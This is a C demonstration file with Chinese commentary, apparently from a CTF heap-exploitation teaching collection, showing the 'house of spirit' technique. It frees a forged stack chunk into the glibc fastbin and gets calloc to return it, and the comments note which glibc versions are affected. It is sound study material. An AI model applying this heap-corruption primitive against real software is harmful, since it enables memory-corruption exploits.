/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_spirit
 * 文件标注范围：fastbin ~ 2.41 ~ 2.42
 * 模拟漏洞：能 free 一个指向伪造 user area 的指针，并控制其前方 size 字段。
 * 核心流程：把栈/全局区伪造成合法 chunk 后 free；fastbin 版需处理 tcache 与 next-size，tcache 版只要求索引和对齐。
 * 成功判据：malloc 返回 fake chunk 的 user area。2.43 只封掉 fastbin 版，tcache 版仍成立。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	void *chunks[7];
	for(int i=0; i<7; i++) {
		chunks[i] = malloc(0x30);
	}
	for(int i=0; i<7; i++) {
		free(chunks[i]);
	}

	// 数组长度 10 与 fastbinsY 的桶数量无关；fake_chunks 只是承载伪 chunk、并由 fastbinsY 中的链表指针间接引用的一段内存。
	long fake_chunks[10] __attribute__ ((aligned (0x10)));

	fake_chunks[1] = 0x40; // 这里写入第一个伪 chunk 的 size 字段，0x40 必须与后续申请的内部尺寸一致。

	fake_chunks[9] = 0x1234; // 给相邻伪 chunk 写入合理的 nextsize，以通过 free 的边界完整性检查。

	void *victim = &fake_chunks[2];
	free(victim);

	for(int i=0; i<7; i++) {
		malloc(0x30);
	}

	void *allocated = calloc(1, 0x30);

	assert(allocated == victim);
}
